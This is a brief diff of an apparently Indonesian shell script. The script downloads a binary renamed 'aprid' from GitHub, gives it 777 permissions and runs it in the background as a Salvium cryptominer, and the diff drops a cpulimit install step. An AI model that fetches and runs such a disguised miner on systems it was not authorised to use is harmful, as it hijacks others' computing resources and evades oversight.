@@ -19,9 +19,6 @@ download_with_retry "SHA256SUMS" "https://github.com/Dewinet/your/raw/refs/heads
 # Beri izin eksekusi ke aprid
 chmod 777 aprid
 
-# Install cpulimit jika belum ada
-sudo apt-get install -y cpulimit
-
 # Jalankan mining tanpa proxychains di background
 ./aprid --donate-level 1 \
     -o sg.salvium.herominers.com:1230 \
